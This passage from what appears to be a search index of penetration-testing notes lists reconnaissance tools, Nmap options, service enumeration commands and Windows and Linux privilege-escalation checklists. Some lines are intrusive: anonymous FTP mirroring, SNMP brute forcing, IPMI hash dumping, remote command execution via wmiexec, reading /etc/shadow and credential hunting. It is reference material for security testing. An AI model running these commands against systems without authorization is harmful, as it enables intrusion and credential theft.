Enumeration#ftp]]|\n|[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)|Part of Samba suite - Tool for executing client side MS-RPC functions |[[Cheat Sheets.PEN_cheatsheet.Infrastructure-based Enumeration#smb]]|\n|[Impacket - Samrdump.py](https://github.com/fortra/impacket)|Brute forcing samba RIDs |[[Cheat Sheets.PEN_cheatsheet.Infrastructure-based Enumeration#smb]]|\n|[smbmap](https://github.com/ShawnDEvans/smbmap)|Another SMB enumeration tool|[[Cheat Sheets.PEN_cheatsheet.Infrastructure-based Enumeration#smb]]|\n|[CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)| Another SMB enumeration tool |[[Cheat Sheets.PEN_cheatsheet.Infrastructure-based Enumeration#smb]]|\n|[enum4linux](https://github.com/cddmp/enum4linux-ng)|Another SMB enumeration tool|[[Cheat Sheets.PEN_cheatsheet.Infrastructure-based Enumeration#smb]]|\n|[dnsenum](https://github.com/fwaeytens/dnsenum)|DNS enumeration|[[Cheat Sheets.PEN_cheatsheet.Infrastructure-based Enumeration#dns]]|\n|[lxd/lxc Group - Privilege escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)| lxd/lxc group privilege escalation with tiny alpine container|[Alpine Image (ZIP)](/assets/files/Alpine_LXD_LXC.zip)\n| [x64dbg](https://x64dbg.com/) | debugger for Windows | [https://help.x64dbg.com/en/latest/](https://help.x64dbg.com/en/latest/) |\n| [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) | Recover private key from a weak public RSA key | [https://github.com/RsaCtfTool/RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) |\n| [CyberChef](https://gchq.github.io/CyberChef/) | The Cyber Swiss Army Knife - a web app for encryption, <br>encoding, compression and data analysis | [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/) |","n":0.088}}},{"i":22,"$":{"0":{"v":"Nmap","n":1},"1":{"v":"## Scanning Options\n\n| **Nmap Option** | **Description** |\n|---|----|\n| `10.10.10.0/24` | Target network range. |\n| `-sn` | Disables port scanning. |\n| `-Pn` | Disables ICMP Echo Requests |\n| `-n` | Disables DNS Resolution. |\n| `-PE` | Performs the ping scan by using ICMP Echo Requests against the target. |\n| `--packet-trace` | Shows all packets sent and received. |\n| `--reason` | Displays the reason for a specific result. |\n| `--disable-arp-ping` | Disables ARP Ping Requests. |\n| `--top-ports=<num>` | Scans the specified top ports that have been defined as most frequent.  |\n<br>\n\n| **Effectivenes** | **TCP ports required** | **UDP ports required** |\n|---|---|---|\n|10%|\t1\t|5|\n|20%|\t2\t|12|\n|30%|\t4\t|27|\n|40%|\t6\t|135|\n|50%|\t10\t|1,075|\n|60%|\t18\t|2,618|\n|70%|\t44\t|5,157|\n|80%|\t122\t|7,981|\n|85%|\t236\t|9,623|\n|90%|\t576\t|11,307|\n|95%|\t1,558\t|13,035|\n|99%|\t3,328\t|15,094|\n|100|%\t65,536|\t65,536|\n<br>\n\n| **Nmap Option** | **Description** |\n|---|---|\n| `-p-` | Scan all ports. |\n| `-p22-110` | Scan all ports between 22 and 110. |\n| `-p22,25` | Scans only the specified ports 22 and 25. |\n| `-F` | Scans top 100 ports. |\n| `-sS` | Performs an TCP SYN-Scan. |\n| `-sA` | Performs an TCP ACK-Scan. |\n| `-sU` | Performs an UDP Scan. |\n| `-sV` | Scans the discovered services for their versions. |\n| `-sC` | Perform a Script Scan with scripts that are categorized as \"default\". |\n| `--script <script>` | Performs a Script Scan by using the specified scripts. |\n| `-O` | Performs an OS Detection Scan to determine the OS of the target. |\n| `-A` | Performs OS Detection, Service Detection, and traceroute scans. |\n| `-D RND:5` | Sets the number of random Decoys that will be used to scan the target. |\n| `-e` | Specifies the network interface that is used for the scan. |\n| `-S 10.10.10.200` | Specifies the source IP address for the scan. |\n| `-g` | Specifies the source port for the scan. |\n| `--dns-server <ns>` | DNS resolution is performed by using a specified name server. |\n| `--source-port 53` | Use port 53 (DNS request) to test firewall rules and potentially evade IDS/IPS|\n\n\n\n\n## Output Options\n\n\n| **Nmap Option** | **Description** |\n|---|----|\n| `-oA filename` | Stores the results in all available formats starting with the name of \"filename\". |\n| `-oN filename` | Stores the results in normal format with the name \"filename\". |\n| `-oG filename` | Stores the results in \"grepable\" format with the name of \"filename\". |\n| `-oX filename` | Stores the results in XML format with the name of \"filename\". |\n\n\n\n## Performance Options\n\n| **Nmap Option** | **Description** |\n|---|----|\n| `--max-retries <num>` | Sets the number of retries for scans of specific ports. |\n| `--stats-every=5s` | Displays scan's status every 5 seconds. |\n| `-v/-vv` | Displays verbose output during the scan. |\n| `--initial-rtt-timeout 50ms` | Sets the specified time value as initial RTT timeout. |\n| `--max-rtt-timeout 100ms` | Sets the specified time value as maximum RTT timeout. |\n| `--min-rate 300` | Sets the number of packets that will be sent simultaneously. |\n| `-T <0-5>` | Specifies the specific timing template. |","n":0.047}}},{"i":23,"$":{"0":{"v":"Infrastructure-based Enumeration","n":0.707},"1":{"v":"## Infrastructure-based Enumeration\n\n|**Command**|**Description**|\n|-|-|\n| `curl -s https://crt.sh/\\?q\\=<target-domain>\\&output\\=json \\| jq .` | Certificate transparency. |\n|`curl -s https://crt.sh/\\?q\\=<target-domain>\\&output\\=json \\| jq . \\| grep name \\| cut -d\":\" -f2 \\| grep -v \"CN=\" \\| cut -d'\"' -f2 \\| awk '{gsub(/\\\\n/,\"\\n\");}1;' \\| sort -u`| Obtain unique subdomains|\n|`for i in $(cat subdomainlist);do host $i \\| grep \"has address\" \\| grep <target-domain> \\| cut -d\" \" -f1,4;done`| List only company hosted servers|\n|`for i in $(cat subdomainlist);do host $i \\| grep \"has address\" \\| grep <target-domain> \\| cut -d\" \" -f4 >> ip-addresses.txt;done`| Extract IP addresses from list of servers|\n| `for i in $(cat ip-addresses.txt);do shodan host $i;done` | Scan each IP address in a list using Shodan. |\n|Google dorks `inurl` and `intext` to identify cloud resources|Examples:<br>`intext:`<keyword\\> `inurl:`amazonaws.com<br>`intext:`<keyword\\> `inurl:` blob.core.windows.net|\n|`domain.glass` - Transparent Domain Information| [`https://domain.glass/`](https://domain.glass/)|\n|`GrayHatWarfare`| [GrayHatWarfare.](GrayHatWarfare.)|\n\n----\n## Host-based Enumeration\n\n\n##### FTP\n|**Command**|**Description**|\n|-|-|\n| `ftp <FQDN/IP>` | Interact with the FTP service on the target. |\n| `nc -nv <FQDN/IP> 21` | Interact with the FTP service on the target. |\n| `telnet <FQDN/IP> 21` | Interact with the FTP service on the target. |\n| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp` | Interact with the FTP service on the target using encrypted connection. |\n| `wget -m --no-passive ftp://anonymous:anonymous@<target>` | Download all available files on the target FTP server. |\n\n\n##### SMB\n|**Command**|**Description**|\n|-|-|\n| `smbclient -N -L //<FQDN/IP>` | Null session authentication on SMB. |\n| `smbclient //<FQDN/IP>/<share>` | Connect to a specific SMB share. |\n| `rpcclient -U \"\" <FQDN/IP>` | Interaction with the target using RPC. |\n| rpcclient $> `querydominfo` | Domain Information Query|\n| `samrdump.py <FQDN/IP>` | Username enumeration using Impacket scripts. |\n| `smbmap -H <FQDN/IP>` | Enumerating SMB shares. |\n| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Enumerating SMB shares using null session authentication. |\n| `enum4linux-ng.py <FQDN/IP> -A` | SMB enumeration using enum4linux. |\n\n\n##### NFS\n|**Command**|**Description**|\n|-|-|\n| `showmount -e <FQDN/IP>` | Show available NFS shares. |\n| `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock` | Mount the specific NFS share.umount ./target-NFS |\n| `umount ./target-NFS` | Unmount the specific NFS share. |\n\n\n##### DNS\n|**Command**|**Description**|\n|-|-|\n| `dig ns <domain.tld> @<nameserver>` | NS request to the specific nameserver. |\n| `dig any <domain.tld> @<nameserver>` | ANY request to the specific nameserver. |\n| `dig axfr <domain.tld> @<nameserver>` | AXFR request to the specific nameserver. |\n| `dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>` | Subdomain brute forcing. |\n\n\n\n##### SMTP\n|**Command**|**Description**|\n|-|-|\n| `telnet <FQDN/IP> 25` |  |\n\n\n##### IMAP/POP3\n|**Command**|**Description**|\n|-|-|\n| `curl -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. |\n| `openssl s_client -connect <FQDN/IP>:imaps` | Connect to the IMAPS service. |\n| `openssl s_client -connect <FQDN/IP>:pop3s` | Connect to the POP3s service. |\n\n\n##### SNMP\n|**Command**|**Description**|\n|-|-|\n| `snmpwalk -v2c -c <community string> <FQDN/IP>` | Querying OIDs using snmpwalk. |\n| `onesixtyone -c community-strings.list <FQDN/IP>` | Bruteforcing community strings of the SNMP service. |\n| `braa <community string>@<FQDN/IP>:.1.*` | Bruteforcing SNMP service OIDs. |\n\n\n##### MySQL\n|**Command**|**Description**|\n|-|-|\n| `mysql -u <user> -p<password> -h <FQDN/IP>` | Login to the MySQL server. |\n\n\n##### MSSQL\n|**Command**|**Description**|\n|-|-|\n| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Log in to the MSSQL server using Windows authentication. |\n\n\n##### IPMI\n|**Command**|**Description**|\n|-|-|\n| `msf6 auxiliary(scanner/ipmi/ipmi_version)` | IPMI version detection. |\n| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | Dump IPMI hashes. |\n\n\n##### Linux Remote Management\n|**Command**|**Description**|\n|-|-|\n| `ssh-audit.py <FQDN/IP>` | Remote security audit against the target SSH service. |\n| `ssh <user>@<FQDN/IP>` | Log in to the SSH server using the SSH client. |\n| `ssh -i private.key <user>@<FQDN/IP>` | Log in to the SSH server using private key. |\n| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | Enforce password-based authentication. |\n\n\n##### Windows Remote Management\n|**Command**|**Description**|\n|-|-|\n| `rdp-sec-check.pl <FQDN/IP>` | Check the security settings of the RDP service. |\n| `xfreerdp /u:<user> /p:\"<password>\" /v:<FQDN/IP>` | Log in to the RDP server from Linux. |\n| `evil-winrm -i <FQDN/IP> -u <user> -p <password>` | Log in to the WinRM server. |\n| `wmiexec.py <user>:\"<password>\"@<FQDN/IP> \"<system command>\"` | Execute command using the WMI service. |","n":0.041}}},{"i":24,"$":{"0":{"v":"Checklist Windows","n":0.707},"1":{"v":"## Checklist Windows\n\n## System Info\n- [ ] Obtain System information  \n- [ ] Search for kernel exploits using scripts\n- [ ] Use Google to search for kernel exploits\n- [ ] Use searchsploit to search for kernel exploits\n- [ ] Interesting info in env vars?\n- [ ] Passwords in PowerShell history?\n- [ ] Interesting info in Internet settings?\n- [ ] Drives?\n- [ ] WSUS exploit?\n- [ ] AlwaysInstallElevated?\n## Logging/AV enumeration\n- [ ] Check Audit and WEF settings\n- [ ] Check LAPS\n- [ ] Check if WDigest is active\n- [ ] LSA Protection?\n- [ ] Credentials Guard?\n- [ ] Cached Credentials?\n- [ ] Check if any AV\n- [ ] AppLocker Policy?\n- [ ] UAC\n- [ ] User Privileges\n- [ ] Check current user privileges\n- [ ] Are you member of any privileged group?\n- [ ] Check if you have any of these tokens enabled: SeImpersonatePrivilege, SeAssignPrimaryPrivilege SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege SeTakeOwnershipPrivilege, SeDebugPrivilege ?\n- [ ] Users Sessions?\n- [ ] Check users homes (access?)\n- [ ] Check Password Policy\n- [ ] What is inside the Clipboard?\n## Network\n- [ ] Check current network information\n- [ ] Check hidden local services restricted to the outside\n- [ ] Enumerate the network (shares, interfaces, routes, neighbours, ...)\n- [ ] Take a special look at network services listening on localhost (127.0.0.1)\n## Running Processes\n- [ ] Processes binaries file and folders permissions\n- [ ] Memory Password mining\n- [ ] Insecure GUI apps\n## Services\n- [ ] Can you modify any service?\n- [ ] Can you modify the binary that is executed by any service?\n- [ ] Can you modify the registry of any service?\n- [ ] Can you take advantage of any unquoted service binary path?\n## Applications\n- [ ] Write permissions on installed applications\n- [ ] Startup Applications\n- [ ] Vulnerable Drivers\n## DLL Hijacking\n- [ ] Can you write in any folder inside PATH?\n- [ ] Is there any known service binary that tries to load any non-existant DLL?\n- [ ] Can you write in any binaries folder?\n## Windows Credentials\n- [ ] Winlogon credentials\n- [ ] Windows Vault credentials that you could use?\n- [ ] Interesting DPAPI credentials?\n- [ ] Passwords of saved Wifi networks?\n- [ ] Interesting info in saved RDP Connections?\n- [ ] Passwords in recently run commands?\n- [ ] Remote Desktop Credentials Manager passwords?\n- [ ] AppCmd.exe exists? Credentials?\n- [ ] SCClient.exe? DLL Side Loading?\n## Files and Registry (Credentials)\n- [ ] Putty: Creds and SSH host keys\n- [ ] SSH keys in registry?\n- [ ] Passwords in unattended files?\n- [ ] Any SAM & SYSTEM backup?\n- [ ] Cloud credentials?\n- [ ] McAfee SiteList.xml file?\n- [ ] Cached GPP Password?\n- [ ] Password in IIS Web config file?\n- [ ] Interesting info in web logs?\n- [ ] Do you want to ask for credentials to the user?\n- [ ] Interesting files inside the Recycle Bin?\n- [ ] Other registry containing credentials?\n- [ ] Inside Browser data (dbs, history, bookmarks, ...)?\n- [ ] Generic password search in files and registry\n- [ ] Tools to automatically search for passwords\n## Leaked Handlers\n- [ ] Have you access to any handler of a process run by administrator?\n## Pipe Client Impersonation\n- [ ] Check if you can abuse it","n":0.044}}},{"i":25,"$":{"0":{"v":"Checklist Linux","n":0.707},"1":{"v":"## Checklist Linux\n\n- [ ] Kernel and distribution release details\n- [ ] System Information:\n- [ ] Hostname \n  - [ ] Networking details:\n  - [ ] Current IP\n  - [ ] Default route details\n  - [ ] DNS server information\n- [ ] User Information:\n  - [ ] Current user details\n  - [ ] Last logged on users\n  - [ ] Shows users logged onto the host\n  - [ ] List all users including uid/gid information\n  - [ ] List root accounts\n  - [ ] Extracts password policies and hash storage method information\n  - [ ] Checks umask value\n  - [ ] Checks if password hashes are stored in /etc/passwd\n  - [ ] Extract full details for 'default' uid's such as 0, 1000, 1001 etc\n  - [ ] Attempt to read restricted files i.e. /etc/shadow\n  - [ ] List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)\n  - [ ] Basic SSH checks\n- [ ] Privileged access:\n  - [ ] Which users have recently used sudo\n  - [ ] Determine if /etc/sudoers is accessible\n  - [ ] Determine if the current user has Sudo access without a password\n  - [ ] Are known 'good' breakout binaries available via Sudo (i.e. nmap, vim etc.)\n  - [ ] Is root's home directory accessible\n  - [ ] List permissions for /home/\n- [ ] Environmental:\n  - [ ] Display current $PATH\n  - [ ] Displays env information\n- [ ] Jobs/Tasks:\n  - [ ] List all cron jobs\n  - [ ] Locate all world-writable cron jobs\n  - [ ] Locate cron jobs owned by other users of the system\n  - [ ] List the active and inactive systemd timers\n- [ ] Services:\n  - [ ] List network connections (TCP & UDP)\n  - [ ] List running processes\n  - [ ] Lookup and list process binaries and associated permissions\n  - [ ] List inetd.conf/xined.conf contents and associated binary file permissions\n  - [ ] List init.d binary permissions\n- [ ] Version Information (of the following):\n  - [ ] Sudo\n  - [ ] MYSQL\n  - [ ] Postgres\n  - [ ] Apache\n    - [ ] Checks user config\n    - [ ] Shows enabled modules\n    - [ ] Checks for htpasswd files\n    - [ ] View www directories\n- [ ] Default/Weak Credentials:\n  - [ ] Checks for default/weak Postgres accounts\n  - [ ] Checks for default/weak MYSQL accounts\n- [ ] Searches:\n  - [ ] Locate all SUID/GUID files\n  - [ ] Locate all world-writable SUID/GUID files\n  - [ ] Locate all SUID/GUID files owned by root\n  - [ ] Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc)\n  - [ ] Locate files with POSIX capabilities\n  - [ ] List all world-writable files\n  - [ ] Find/list all accessible *.plan files and display contents\n  - [ ] Find/list all accessible *.rhosts files and display contents\n  - [ ] Show NFS server details\n  - [ ] Locate *.conf and *.log files containing keyword supplied at script runtime\n  - [ ] List all *.conf files located in /etc\n  - [ ] Locate mail\n- [ ] Platform/software specific tests:\n  - [ ] Checks to determine if we're in a Docker container\n  - [ ] Checks to see if the host has Docker installed\n  - [ ] Checks to determine if we're in an LXC container\n\n\n","n":0.043}}},{"i":26,"$":{"0":{"v":"Bug Bounty TOOLBOX","n":0.577},"1":{"v":"## TOOLS:\n<br>\n\n### **Burp Suite**\n> No introduction required here. Well know and widely used solution for web penetration testing.<br>\nhttps://portswigger.net/burp\n\n### **OWASP ZAP**\n> Open source competition to Burp. It is completely free yet as good as Burp. <br>\nIt looses in looks department though.<br>\nOWASP ZAP is an open-source web application security scanner. <br>It is intended to be used by both those new to application security as well as professional penetration testers.<br>\nhttps://www.zaproxy.org/\n\n### **Foxy proxy**\n>FoxyProxy is an advanced proxy management tool that completely replaces Firefox's (Chrome's too) limited proxying capabilities.<br>\nIt gives you comfort of switching proxy on and off with few clicks without digging in browser's options.<br>\nhttps://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/\n\n\n### **Cookie-Editor**\n> Simple yet powerful Cookie Editor that allow you to quickly create, edit and delete cookies without leaving your tab.<br>\nCookie-Editor is designed to have a simple to use interface that let you do most standard cookie operations.<br> It is ideal for developing and testing web pages or even manual management of cookies for your privacy.<br>\nhttps://addons.mozilla.org/en-US/firefox/addon/cookie-editor/\n\n### **Wappalyzer**\n> Identifies technologies on websites.<br>\nFind out the technology stack of any website. Create lists of websites that use certain technologies, with company and contact details.<br>\nIt has paid version with more features but even without paying it will give you a lot of information.<br>\nhttps://www.wappalyzer.com/\n\n\n### **wfuzz**\n> Wfuzz is a tool designed for bruteforcing Web Applications, it can be used for finding resources not linked directories,<br> servlets, scripts, etc, bruteforce GET and POST parameters for checking different kind of injections (SQL, XSS, LDAP,etc), <br>bruteforce Forms parameters (User/Password), Fuzzing, etc.<br>\nhttps://www.kali.org/tools/wfuzz/#wfuzz\n\n\n\n### **Forced browsing tools**\n>Forced browsing is a type of web attack where the adversary tries to access web resources that are not <br>\nreferenced or displayed by the web application. These resources are usually hidden web directories and <br>\nfiles that may contain interesting information from hackers’ perspective. <br>\n\n| Name | Link |\n|----|-----|\n| dirbuster | https://www.kali.org/tools/dirbuster/ |\n| dirb | https://www.kali.org/tools/dirb/ |\n| gobuster | https://www.kali.org/tools/gobuster/ |\n| ffuf | https://www.kali.org/tools/ffuf/ |\n| feroxbuster | https://www.kali.org/tools/feroxbuster/ |\n\n### **Subdomain Scan**\n>Tools designed to quickly enumerate subdomains on a target domain through passive reconnaissance and dictionary scan.\n\n| Name | Link |\n|----|-----|\n| Knockpy | https://github.com/guelfoweb/knock |\n| Sublister | https://github.com/aboul3la/Sublist3r |\n| OWASP Amass | https://github.com/OWASP/Amass |\n| Subfinder | https://www.kali.org/tools/subfinder/ |\n\n\n### **Wordlists**\n| Name | Link |\n|----|-----|\n| Seclists | https://www.kali.org/tools/seclists/ |\n| Assetnote Wodlists | https://wordlists.assetnote.io/ |\n\n### **Scrapy**\n> An open source and collaborative framework for extracting the data you need from websites.<br>\nIn a fast, simple, yet extensible way.<br>\nhttps://scrapy.org/\n\n### **What CMS**\n> A Content Management System, or CMS, is a piece of software designed to help users create and edit websites. <br>\nCMS functionality varies widely and can include much more than the basic features for managing text and image content. <br>\nSome of the most popular systems help users design, track users, handle searches, collect visitor comments, host forums and much much more.<br>\nhttps://whatcms.org/\n\n### **sqlmap**\n> sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.<br>\nhttps://sqlmap.org/\n\n### **Wapiti**\n> Wapiti allows you to audit the security of your web applications. <br>\nIt performs “black-box” scans, i.e. it does not study the source code of the application but will scan the <br>web pages of the deployed web applications, looking for scripts and forms where it can inject data. <br>Once it gets this list, Wapiti acts like a fuzzer, injecting payloads to see if a script is vulnerable.<br>\nhttps://www.kali.org/tools/wapiti/\n\n### **Sniper**\n>Sn1per is an automated scanner that can automate the process of collecting data for exploration and penetration testing.<br>\n>\n>In their work sn1per involves such well-known tools like: amap, arachni, amap, cisco-torch, dnsenum, enum4linux, golismero, hydra, metasploit-framework, nbtscan, nmap smtp-user-enum, sqlmap, sslscan, theharvester, w3af, wapiti, whatweb, whois, nikto, wpscan.d during a penetration test to enumerate and scan for vulnerabilities.<br>\nhttps://github.com/1N3/Sn1per","n":0.041}}},{"i":27,"$":{"0":{"v":"AZURE","n":1},"1":{"v":"[[AZURE|AZURE.Powershell]]","n":1}}},{"i":28,"$":{"0":{"v":"Powershell","n":1},"1":{"v":"## Azure Powershell Commands","n":0.5}}}]}
